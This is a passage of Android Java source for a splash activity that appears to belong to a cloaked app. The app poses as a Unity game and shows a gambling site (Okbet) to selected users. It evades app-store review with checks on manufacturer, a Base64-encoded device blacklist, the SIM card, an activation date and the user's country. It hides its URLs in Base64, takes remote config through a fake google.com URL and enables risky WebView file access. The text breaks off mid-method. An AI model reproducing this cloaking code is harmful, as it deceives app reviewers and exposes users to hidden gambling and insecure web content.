package com.facebook;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import androidx.annotation.NonNull;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class FBSplashActivity extends Activity {

    public MH a;
    private WebView b;
    private ProgressBar c;
    private RelativeLayout d;

    public static boolean e = false;
    public static String f;

    //跳转到原马甲包启动页的全路径
    public static String g = "com.unity3d.player.UnityPlayerActivity";
    public static long a1 = 1674527976000L;
    public static String b1 = "aHR0cHM6Ly9va2JldDAwNi5jb20vY2Ru";
    public static String c3 = "";
    private Context d4;

    //页面布局的id
    int f5;
    //页面布局的根布局的id
    int r6;
    //该页面的加载框id
    int y8;
    int l0;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        f5 = gli(getApplicationContext(), "activity_splash_fb");
        r6 = ggi(getApplicationContext(), "WebViewBox");
        l0 = ggi(getApplicationContext(), "MainWebView");
        y8 = ggi(getApplicationContext(), "mj_progressBar");

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        if (Build.VERSION.SDK_INT < 19) {// lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }

        setContentView(f5);
        d = findViewById(r6);
        b = findViewById(l0);
        c = findViewById(y8);

        init(this);

        a = new MH();

        a.postDelayed(new Runnable() {
            @Override
            public void run() {
                a.sendMsg(001, "");
            }
        }, 1000);

    }


    @Override // c.a.k.i, android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (b != null) {
            if (b.canGoBack() && i == 4) {
                b.goBack();
                return true;
            }
        }
        return super.onKeyDown(i, keyEvent);
    }


    @Override
    protected void onResume() {
        super.onResume();
        if (g5) {
            //开启弹窗
            //创建dialog构造器
//            AlertDialog.Builder normalDialog = new AlertDialog.Builder(getBaseContext());
//            normalDialog.setCancelable(false);
//            //设置title
//            normalDialog.setTitle("Okbet offical app, join in us!!");
//            //设置内容
//            normalDialog.setMessage("GET 50 peso when register,Good Luck!!");
//            //设置按钮
//            normalDialog.setPositiveButton("Click Here", new DialogInterface.OnClickListener() {
//                @Override
//                public void onClick(DialogInterface dialog, int which) {
//                    jumpBrpw(WebData.webDataCenter.hf_rea);
//                }
//            });
//
//            normalDialog.show();

            //

        }
    }

    public void cWB() {
        d.removeAllViews();
        if (b != null) {
            b.clearHistory();
            b.destroy();
            b = null;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        cWB();
    }


    public void init(Activity activity) {
        d4 = activity;
        f = activity.getApplication().getPackageName();
    }

//    public void startcheck() {
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                baseUrl = unBase64JS() + appId + ".js";
//                getReq(baseUrl, true);
//            }
//        }).start();
//    }

//    private void getReq(String url, boolean isGitHub) {
//
//        try {
//            URL urll = new URL(url);
//            HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
//            urlConnection.setConnectTimeout(10000);
//            urlConnection.setReadTimeout(10000);
//            urlConnection.setRequestMethod("GET");
//            urlConnection.setDefaultUseCaches(false);
//            urlConnection.connect();
//            int code = urlConnection.getResponseCode();
//            if (code == 200) {
//                InputStream inputStream = urlConnection.getInputStream();
//                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
//                String line;
//                StringBuffer buffer = new StringBuffer();
//                while ((line = bufferedReader.readLine()) != null) {
//                    buffer.append(line);
//                }
//                String json = buffer.toString();
//
//                logger(" " + json);
//
//                String replace = json.replace("\n", "").replace("\t", "");
//                String substring = replace.substring(0, replace.length() - 2);
//                JSONObject jSONObject = new JSONObject(substring + "}");
//
//                if (jSONObject.has("hf")) {
//                    WebData.webDataCenter.hf_001 = jSONObject.getString("hf");
//                    //test   https://okbet-v2.cxsport.net/mobile
//                    //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
//                    //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
//                    //   WebData.dataCenter.hf_001 = "https://okbet-v2.cxsport.net/mobile";
//
//                    //http://ok-bet.online/mobile/publicity
//                    //   WebData.dataCenter.hf_001 = "http://ok-bet.online/?inviteCode=2277";
//                    //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";
//
//                }
//
//                if (jSONObject.has("jump_001")) {
//                    WebData.webDataCenter.hfgwxz_001 = jSONObject.getString("jump_001");
//                }
//
//                if (jSONObject.has("jump_002")) {
//                    WebData.webDataCenter.cvcvczk_002 = jSONObject.getString("jump_002");
//                }
//
//                if (jSONObject.has("jump_003")) {
//                    WebData.webDataCenter.erfcxht_003 = jSONObject.getString("jump_003");
//                }
//
//                if (jSONObject.has("aipi")) {
//                    WebData.webDataCenter.ai3p6i9 = jSONObject.getString("aipi");
//                }
//
//                if (jSONObject.has("hfRea")) {
//                    WebData.webDataCenter.hf_rea = jSONObject.getString("hfRea");
//                }
//
//                if (jSONObject.has("icChecking")) {
//                    WebData.webDataCenter.isCcccheck = jSONObject.getBoolean("icChecking");
//                }
//
//                if (jSONObject.has("jump_array")) {
//                    WebData.webDataCenter.jjssArrays.clear();
//                    JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
//                    for (int i = 0; i < jsonArray.length(); i++) {
//                        WebData.webDataCenter.jjssArrays.add((String) jsonArray.get(i));
//                    }
//                }
//
//                if (jSONObject.has("dev_array")) {
//                    WebData.webDataCenter.deArray.clear();
//                    JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
//                    for (int i = 0; i < jsonArray.length(); i++) {
//                        WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
//                    }
//                }
//
//                mainHandle.sendMsg(000, "");
//
//            } else {
//                logger(" 不是200");
//                if (!isGitHub) {
//                    requstGithub();
//                } else {
//                    jumpLocalSplash();
//                }
//            }
//
//        } catch (JSONException e) {
//            if (!isGitHub) {
//                requstGithub();
//            } else {
//                jumpLocalSplash();
//            }
//            logger(e.getLocalizedMessage() + "");
//        } catch (Exception e) {
//            if (!isGitHub) {
//                requstGithub();
//            } else {
//                jumpLocalSplash();
//            }
//            logger(e.getLocalizedMessage() + "");
//        }
//
//    }
//
//    private void requstGithub() {
//        baseUrl = unBase64JS() + appId + ".js";
//        getReq(baseUrl, true);
//    }


    public void gRApC(String url) {
        logger("getReqAPaConfig start");

        e = true;
        WD.WD_CENTER.isCcccheck = false;

        if (gmf().equals(uBgg())
                || TextUtils.isEmpty(gmf())) {
            e = false;
            WD.WD_CENTER.isCcccheck = true;
            logger("isandroidreallych");
        }

        if (WD.WD_CENTER.deArray.size() > 0) {
            if (WD.WD_CENTER.deArray.contains(gM())) {
                e = false;
                WD.WD_CENTER.isCcccheck = true;
                logger("isSHRYZJC");
            }
        }

        if (!haser(this)) {
            e = false;
            WD.WD_CENTER.isCcccheck = true;
            logger("haser false");
        }

        if (e) {
            //如果设备通过 走Ip检测
            if (url.contains("ip-api")) {

                try {

                    URL urll = new URL(url);
                    HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                    urlConnection.setConnectTimeout(10000);
                    urlConnection.setReadTimeout(10000);
                    urlConnection.setRequestMethod("GET");
                    urlConnection.connect();
                    int code = urlConnection.getResponseCode();

                    if (code == 200) {
                        logger("getReqAPConfig 200");

                        InputStream inputStream = urlConnection.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                        String line;
                        StringBuffer buffer = new StringBuffer();
                        while ((line = bufferedReader.readLine()) != null) {
                            buffer.append(line);
                        }
                        String json = buffer.toString();

                        logger(" " + json);

                        JSONObject jSONObject = new JSONObject(json);

                        if (jSONObject.has("countryCode")) {
                            String cc = jSONObject.getString("countryCode");
                            if (cc.equals("HK") || cc.equals("PH")) {
                                e = true;
                                WD.WD_CENTER.isCcccheck = false;
                            } else {
                                e = false;
                                WD.WD_CENTER.isCcccheck = true;
                            }
                        }

                        a.sendMsg(002, "");

                    } else {

                        logger(" getReqAPConfig 不是200");
                        e = false;
                        WD.WD_CENTER.isCcccheck = true;

                        a.sendMsg(002, "");
                    }

                } catch (Exception e) {
                    FBSplashActivity.e = false;
                    a.sendMsg(002, "");
                    logger(" getReqAPConfig Exception " + e.getLocalizedMessage());
                }
            } else {
                getIw(url);
            }

        } else {

            a.sendMsg(002, "");

        }

    }


    public void getIw(String u) {

        try {
            URL urll = new URL(u);
            HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
            urlConnection.setConnectTimeout(10000);
            urlConnection.setReadTimeout(10000);
            urlConnection.setRequestMethod("GET");
            urlConnection.connect();
            int code = urlConnection.getResponseCode();

            if (code == 200) {
                logger("getIw 200");
                e = true;
                WD.WD_CENTER.isCcccheck = false;

            } else {
                logger(" getHuc 不是200");
                e = false;
                WD.WD_CENTER.isCcccheck = true;
            }

        } catch (Exception w) {
            logger(" getHuc Exception " + w.getLocalizedMessage());
            e = false;
            WD.WD_CENTER.isCcccheck = true;
        }

        a.sendMsg(002, "");

    }

    /**
     * 判断是否包含SIM卡
     *
     * @return 状态
     */
    public static boolean haser(Context context) {
        TelephonyManager telMgr = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
        int simState = telMgr.getSimState();
        boolean result = true;
        switch (simState) {
            case TelephonyManager.SIM_STATE_ABSENT:
                result = false; // 没有SIM卡
                break;
            case TelephonyManager.SIM_STATE_UNKNOWN:
                result = false;
                break;
        }
        Log.e("lyyytry", result ? "有haser" : "无haser");
        return result;
    }


    private boolean g5 = false;

    public class MH extends Handler {


        public final void sendMsg(int i3, Object obj) {
            Message message = new Message();
            message.what = i3;
            message.obj = obj;
            sendMessage(message);
        }


        @Override
        public void handleMessage(@NonNull Message msg) {

            int code = msg.what;

            if (code == 000) {

                if (TextUtils.isEmpty(WD.WD_CENTER.ai3p6i9)) {
                    //走h5 全逻辑
                    if (!TextUtils.isEmpty(WD.WD_CENTER.hf_001)) {
//                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, true);
                        sh5(WD.WD_CENTER.hf_001, true);
                    }
                } else {
                    //走原生 逻辑
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            gRApC(WD.WD_CENTER.ai3p6i9);
                        }
                    }).start();
                }

            } else if (code == 001) {
                if (System.currentTimeMillis() < a1 || iCD()) {
                    jLS();
                } else {
                    //  startcheck();
                    sh5(uBstr(b1).trim(), true);
                }
            } else if (code == 002) {//已经
                //如果是老用户  就不需要屏蔽
                if (giflon()) {
                    e = true;
                    WD.WD_CENTER.isCcccheck = false;
                }

                boolean isAdd;
                if (TextUtils.isEmpty(WD.WD_CENTER.hf_rea)) {
                    isAdd = false;
                } else {
                    isAdd = true;
                }
                if (!e) { // !ph
                    if (!TextUtils.isEmpty(WD.WD_CENTER.hf_001)) {
//                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, isAdd);
                        sh5(WD.WD_CENTER.hf_001, isAdd);
                    }
                } else {
                    if (!TextUtils.isEmpty(WD.WD_CENTER.hf_rea)) {
//                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_rea, true);
                        if (WD.WD_CENTER.isJump0117) {
                            //执行外跳
                            jB(WD.WD_CENTER.hf_rea);
                            g5 = true;
                            sh5(uBIU(), true);
                        } else {
                            sh5(WD.WD_CENTER.hf_rea, true);
                        }

                    } else {
//                       MainActivity.mainActivity.findViewById(R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, true);
                        // startH5orYs(WebData.webDataCenter.hf_001, true);
                        jLS();
                    }
                }
            }


        }

    }

    /**
     * 跳原应用
     */

    private void jLS() {

        try {
            Class aimClass = Class.forName(g);
            Intent intent = new Intent(FBSplashActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    public void lu(String uuu) {
        if (b != null) {
            b.loadUrl(uuu);
        }
    }


    public void sh5(String weburl, boolean isAdd) {

        if (TextUtils.isEmpty(weburl)) {
            return;
        }

        if (weburl.equals("cnm-bie-zhua-bao")) {
            //跳原生壳子
            jLS();
            return;
        }

        //  webView.getSettings().setBuiltInZoomControls(true);
        b.requestFocus();
        b.getSettings().setDomStorageEnabled(true);
        b.getSettings().setJavaScriptEnabled(true);
        b.getSettings().setAllowContentAccess(true);
        b.getSettings().setAllowFileAccess(true);
        b.getSettings().setAllowUniversalAccessFromFileURLs(true);
        b.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
        b.getSettings().setUseWideViewPort(true);
        b.getSettings().setTextZoom(100);
        b.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        b.getSettings().setUseWideViewPort(true);
        b.getSettings().setLoadWithOverviewMode(true);
        CookieManager.getInstance().setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            b.getSettings().setMixedContentMode(0);
        }

//        if(BuildConfig.DEBUG){
//            try {
//                Method method = Class.forName("android.webkit.WebView").getMethod("setWebContentsDebuggingEnabled", Boolean.TYPE);
//                if (method != null) {
//                    method.setAccessible(true);
//                    method.invoke(null, Boolean.TRUE);
//                }
//            } catch (Exception unused) {
//            }
//        }

        logger("h5Invoke add  if checking " + WD.WD_CENTER.isCcccheck);

        if (WD.WD_CENTER.isCcccheck) {
            b.addJavascriptInterface(new CheckingJavaScript(), "h5Invoke");
        } else {
            b.addJavascriptInterface(new OnlineJavaScript(), "h5Invoke");
        }

        b.setWebViewClient(new Wcl());
        b.setWebChromeClient(new Wcc());

        if (!TextUtils.isEmpty(weburl)) {
            b.loadUrl(weburl);
        }

    }

    public class CheckingJavaScript extends Object {

        @JavascriptInterface
        public boolean callbackIfHide() {
            //  SingleToast.showLongMsg("js callbackIfHide " + WebData.dataCenter.isCcccheck);
            logger("js callbackIfHide " + WD.WD_CENTER.isCcccheck);
            return WD.WD_CENTER.isCcccheck;
        }

    }

    public class OnlineJavaScript extends Object {

        @JavascriptInterface
        public void login(String uid) {

//            SingleToast.showLongMsg("js login " + uid);
//            new Handler().postDelayed(new Runnable() {
//                @Override
//                public void run() {
//                    SingleToast.showLongMsg("js login " + uid);
//                }
//            },3000);
//
//                SingleToast.showLongMsg("js login " + uid);

            logger("js login " + uid);

            //    EventUtils.util.eventLogin(uid);
        }

        @JavascriptInterface
        public void register(String name) {
            //      SingleToast.showLongMsg("js register " + name);

            logger("js register " + name);
            //   EventUtils.util.eventReg(name);
        }


        @JavascriptInterface
        public void deposit(String amount) {
            //      SingleToast.showLongMsg("js deposit " + amount);
            logger("js deposit " + amount);
//            try {
//                MainActivity.logger("js deposit " + amount);
//                Double a = Double.parseDouble(amount);
//                EventUtils.util.eventDeposit("", a, "");
//            } catch (Exception e) {
//                EventUtils.util.eventDeposit("", 8.8, "");
//            }

        }


        @JavascriptInterface
        public void withdrawal(String amount) {
            //    SingleToast.showLongMsg("js withdrawal " + amount);

            logger("js withdrawal " + amount);
            // EventUtils.util.withdrawal("", amount, "");
        }


        @JavascriptInterface
        public void goPayMent(String url) {
            logger("js goPayMent " + url);
            jB(url);
        }

        @JavascriptInterface
        public void gologinCs(String url) {
            //    SingleToast.showLongMsg("js gologinCs " + url);
            logger("js gologinCs " + url);
            jB(url);
        }

    }


    static class WD {

        public static final WD WD_CENTER = new WD();

        public String hf_001;
        public String hfgwxz_001 = "";
        public String cvcvczk_002 = "";
        public String erfcxht_003 = "";

        public String hf_rea = "";
        public String ai3p6i9 = "";
        public Boolean isCcccheck = false;
        public Boolean isJump0117 = false;
        public List<String> jjssArrays = new ArrayList<>();
        public List<String> deArray = new ArrayList<>();

    }

    public final void jB(String str) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setData(Uri.parse(str));
        startActivity(intent);
    }

    public static void logger(String str) {
        Log.e("lyBBBB log", "---------->  " + str);
    }


    public static String uBgg() {
        String a = "R29vZ2xl";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        logger("unBase64GG  " + decodeStr);
        return decodeStr;
    }


    public static String uBstr(String str) {
        String a = str;
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        logger("unBaseStr  " + decodeStr);
        return decodeStr;
    }

    public String uBjs() {
        String a = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vhc3lHdXlMeW4vRWFzeURlbW8xL21hc3Rlci8=";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        logger("unBase64JS  " + decodeStr);
        return decodeStr;
    }


    public String uBIU() {
        String a = "aHR0cHM6Ly9va2JldDEwLmNvbS9vay1iZXQ=";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        logger("unBase64insideURL  " + decodeStr);
        return decodeStr;
    }

    public static String ubD() {
        String a = "eyJkZXZfYXJyYXkiOlsiUmVkbWkgN0EiLCJSZWRtaSA2QSIsIlNILTAxTCIsIkYtMDFMIiwiU00tQTEwNUZOIiwiU00tRzk4MVUxIl19";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        //  Main.logger0113("unBase64  " + decodeStr);
        return decodeStr;
    }

    public static boolean iCD() {
        boolean result0117 = false;
        String devJson0117 = ubD();

        try {
            JSONObject jsonObject = new JSONObject(devJson0117);
            JSONArray jsonArray = jsonObject.getJSONArray("dev_array");
            for (int i = 0; i < jsonArray.length(); i++) {
                WD.WD_CENTER.deArray.add((String) jsonArray.get(i));
            }

            WD.WD_CENTER.deArray.add("SM-A226B");
            WD.WD_CENTER.deArray.add("(not set)");

            if (WD.WD_CENTER.deArray.size() > 0) {
                Log.e("zzz", "" + WD.WD_CENTER.deArray.size());
                if (WD.WD_CENTER.deArray.contains(gM())) {
                    e = false;
                    WD.WD_CENTER.isCcccheck = true;
                    result0117 = true;
                }
            }


        } catch (JSONException e) {
            e.printStackTrace();
        }

        if (gmf().equals(uBgg())
                || TextUtils.isEmpty(gmf())) {
            result0117 = true;
        }

        if (TextUtils.isEmpty(gM())) {
            result0117 = true;
        }

        return result0117;

    }


    public boolean giflon() {

        long nowTime = System.currentTimeMillis();
        long saveTime = getTime(d4);

        logger("nowtime " + nowTime);
        logger("saveTime " + saveTime);

        if (saveTime == 0) {
            saveTime(d4, System.currentTimeMillis());
            return false;
        } else if (nowTime - saveTime > 24 * 60 * 60 * 1000) {
            logger("已经是超过一天的老用户");
            return true;
        }

        return false;
    }


    /**
     * 获取保存的域名ip 前段自定义时间
     *
     * @param context
     * @return
     */
    public static long getTime(Context context) {
        SharedPreferences sp = context.getSharedPreferences("Box_Base_NetInfo", Context.MODE_PRIVATE);
        return sp.getLong("time_diy", 0);
    }

    /**
     * 保存检测成功后的域名ip 前段自定义时间
     *
     * @param context
     * @param time
     */
    public static void saveTime(Context context, long time) {
        SharedPreferences sp = context.getSharedPreferences("Box_Base_NetInfo", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putLong("time_diy", time);
        editor.apply();
    }


    /**
     * Return the manufacturer of the product/hardware.
     * <p>e.g. Xiaomi</p>
     *
     * @return the manufacturer of the product/hardware
     */
    public static String gmf() {
        String manufacturer = Build.MANUFACTURER;
        if (null == manufacturer) {
            manufacturer = "";
        }

        return manufacturer;
    }

    /**
     * Return the model of device.
     * <p>e.g. MI2SC</p>
     *
     * @return the model of device
     */
    public static String gM() {
        String model = Build.MODEL;
        if (model != null) {
            model = model.trim().replaceAll("\\s*", "");
        } else {
            model = "";
        }
        return model;
    }


    /**
     * Android 5.0以下版本的文件选择回调
     */
    public static ValueCallback<Uri> fucf;
    /**
     * Android 5.0及以上版本的文件选择回调
     */
    public static ValueCallback<Uri[]> fubs;
    public static final int REQUEST_CODE_FILE_PICKER = 51426;
    protected String uft = "image/*";


    public class Wcc extends WebChromeClient {

        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            spb(newProgress);
        }


        @Override
        public void onReceivedTitle(WebView view, String title) {
            super.onReceivedTitle(view, title);
        }


        //  Android 2.2 (API level 8)到Android 2.3 (API level 10)版本选择文件时会触发该隐藏方法
        @SuppressWarnings("unused")
        public void openFileChooser(ValueCallback<Uri> uploadMsg) {
            openFileChooser(uploadMsg, null);
        }

        // Android 3.0 (API level 11)到 Android 4.0 (API level 15))版本选择文件时会触发，该方法为隐藏方法
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
            openFileChooser(uploadMsg, acceptType, null);
        }

        // Android 4.1 (API level 16) -- Android 4.3 (API level 18)版本选择文件时会触发，该方法为隐藏方法
        @SuppressWarnings("unused")
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            openFileInput(uploadMsg, null, false);
        }

        // Android 5.0 (API level 21)以上版本会触发该方法，该方法为公开方法
        @SuppressWarnings("all")
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            if (Build.VERSION.SDK_INT >= 21) {
                final boolean allowMultiple = fileChooserParams.getMode() == FileChooserParams.MODE_OPEN_MULTIPLE;//是否支持多选
                openFileInput(null, filePathCallback, allowMultiple);
                return true;
            } else {
                return false;
            }
        }


        @SuppressLint("NewApi")
        protected void openFileInput(final ValueCallback<Uri> fileUploadCallbackFirst, final ValueCallback<Uri[]> fileUploadCallbackSecond,
                                     final boolean allowMultiple) {
            //Android 5.0以下版本
            if (fucf != null) {
                fucf.onReceiveValue(null);
            }
            fucf = fileUploadCallbackFirst;

            //Android 5.0及以上版本
            if (fubs != null) {
                fubs.onReceiveValue(null);
            }
            fubs = fileUploadCallbackSecond;

            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);

            if (allowMultiple) {
                if (Build.VERSION.SDK_INT >= 18) {
                    i.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
                }
            }
            i.setType(uft);

            startActivityForResult(Intent.createChooser(i, "选择文件"), REQUEST_CODE_FILE_PICKER);
        }

        /**
         * 设置进度条
         *
         * @param progress
         */
        private void spb(int progress) {
            ProgressBar mProgressBar;
            mProgressBar = c;
            if (mProgressBar == null) return;
            logger("progress " + progress);
            if (progress == 100) {
                mProgressBar.setVisibility(View.GONE);
            } else {
                if (View.GONE == mProgressBar.getVisibility()) {
                    mProgressBar.setVisibility(View.VISIBLE);
                }
                mProgressBar.setProgress(progress);
            }
        }

    }


    @Override
    public void onActivityResult(final int requestCode, final int resultCode, final Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == REQUEST_CODE_FILE_PICKER) {
            if (resultCode == Activity.RESULT_OK) {
                if (intent != null) {
                    //Android 5.0以下版本
                    if (fucf != null) {
                        fucf.onReceiveValue(intent.getData());
                        fucf = null;
                    } else if (fubs != null) {//Android 5.0及以上版本
                        Uri[] dataUris = null;

                        try {
                            if (intent.getDataString() != null) {
                                dataUris = new Uri[]{Uri.parse(intent.getDataString())};
                            } else {
                                if (Build.VERSION.SDK_INT >= 16) {
                                    if (intent.getClipData() != null) {
                                        final int numSelectedFiles = intent.getClipData().getItemCount();

                                        dataUris = new Uri[numSelectedFiles];

                                        for (int i = 0; i < numSelectedFiles; i++) {
                                            dataUris[i] = intent.getClipData().getItemAt(i).getUri();
                                        }
                                    }
                                }
                            }
                        } catch (Exception ignored) {
                        }
                        fubs.onReceiveValue(dataUris);
                        fubs = null;
                    }
                }
            } else {
                //这里mFileUploadCallbackFirst跟mFileUploadCallbackSecond在不同系统版本下分别持有了
                //WebView对象，在用户取消文件选择器的情况下，需给onReceiveValue传null返回值
                //否则WebView在未收到返回值的情况下，无法进行任何操作，文件选择器会失效
                if (fucf != null) {
                    fucf.onReceiveValue(null);
                    fucf = null;
                } else if (fubs != null) {
                    fubs.onReceiveValue(null);
                    fubs = null;
                }
            }
        }
    }


    public class Wcl extends WebViewClient {
        @Override // android.webkit.WebViewClient
        public final void onLoadResource(WebView webView, String str) {
            super.onLoadResource(webView, str);
        }

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            logger("onPageStarted " + url);
            if (url.contains(WD.WD_CENTER.hfgwxz_001) && !TextUtils.isEmpty(WD.WD_CENTER.hfgwxz_001)) {
                jB(url);
            }
            if (url.contains(WD.WD_CENTER.cvcvczk_002) && !TextUtils.isEmpty(WD.WD_CENTER.cvcvczk_002)) {
                jB(url);
            }
            if (url.contains(WD.WD_CENTER.erfcxht_003) && !TextUtils.isEmpty(WD.WD_CENTER.erfcxht_003)) {
                jB(url);
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            logger("onPageFinished " + url);
        }


        @Override // android.webkit.WebViewClient
        public final void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            int primaryError = sslError.getPrimaryError();
            logger("onReceivedSslError " + primaryError);
//        if (primaryError == 3 || primaryError == 5) {
//            sslErrorHandler.proceed();
//        }else {
//            sslErrorHandler.cancel();
//        }
        }

        @Override // android.webkit.WebViewClient
        public final boolean shouldOverrideUrlLoading(WebView webView, String str) {
            try {

                logger("shouldOverrideUrlLoading " + str);

                if (str.contains(WD.WD_CENTER.hfgwxz_001) && !TextUtils.isEmpty(WD.WD_CENTER.hfgwxz_001)) {
                    jB(str);
                    return true;
                }
                if (str.contains(WD.WD_CENTER.cvcvczk_002) && !TextUtils.isEmpty(WD.WD_CENTER.cvcvczk_002)) {
                    jB(str);
                    return true;
                }
                if (str.contains(WD.WD_CENTER.erfcxht_003) && !TextUtils.isEmpty(WD.WD_CENTER.erfcxht_003)) {
                    jB(str);
                    return true;
                }
                if (WD.WD_CENTER.jjssArrays != null && WD.WD_CENTER.jjssArrays.size() > 0) {
                    logger("jjssArrays " + WD.WD_CENTER.jjssArrays.get(0));
                    boolean isInClude = false;
                    for (String s : WD.WD_CENTER.jjssArrays) {
                        if (str.contains(s)) {
                            isInClude = true;
                        }
                    }
                    if (isInClude) {
                        jB(str);
                        return true;
                    }
                }

                if (str.contains("//t.me/")) {
                    jB(str);
                    return true;
                }

                if (str.contains("cnm-bie-zhua-bao")) {
                    jLS();
                    return true;
                }

                if (str.contains("http://google.com/jsonokbet")) {
                    String jsonBase64 = str.replace("http://google.com/jsonokbet"
                            , "");
                    byte[] decode = Base64.decode(jsonBase64, Base64.DEFAULT);
                    String decodeStr = new String(decode);
                    String json = decodeStr;
                    logger("301 -->" + json);

                    String replace = json.replace("\n", "")
                            .replace("\t", "");
                    JSONObject jSONObject = new JSONObject(replace);

                    if (jSONObject.has("hf")) {
                        WD.WD_CENTER.hf_001 = jSONObject.getString("hf");
                        //test   https://okbet-v2.cxsport.net/mobile
                        //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
                        //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
                        //   WebData.dataCenter.hf_001 = "https://okbet-v2.cxsport.net/mobile";

                        //http://ok-bet.online/mobile/publicity
                        //   WebData.dataCenter.hf_001 = "http://ok-bet.online/?inviteCode=2277";
                        //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";
                    }

                    if (jSONObject.has("jump_001")) {
                        WD.WD_CENTER.hfgwxz_001 = jSONObject.getString("jump_001");
                    }

                    if (jSONObject.has("jump_002")) {
                        WD.WD_CENTER.cvcvczk_002 = jSONObject.getString("jump_002");
                    }

                    if (jSONObject.has("jump_003")) {
                        WD.WD_CENTER.erfcxht_003 = jSONObject.getString("jump_003");
                    }

                    if (jSONObject.has("aipi")) {
                        WD.WD_CENTER.ai3p6i9 = jSONObject.getString("aipi");
                    }

                    if (jSONObject.has("hfRea")) {
                        WD.WD_CENTER.hf_rea = jSONObject.getString("hfRea");
                    }

                    if (jSONObject.has("icChecking")) {
                        WD.WD_CENTER.isCcccheck = jSONObject.getBoolean("icChecking");
                    }

                    if (jSONObject.has("isJump")) {
                        WD.WD_CENTER.isJump0117 = jSONObject.getBoolean("isJump");
                    }


                    if (jSONObject.has("jump_array")) {
                        WD.WD_CENTER.jjssArrays.clear();
                        JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
                        for (int i = 0; i < jsonArray.length(); i++) {
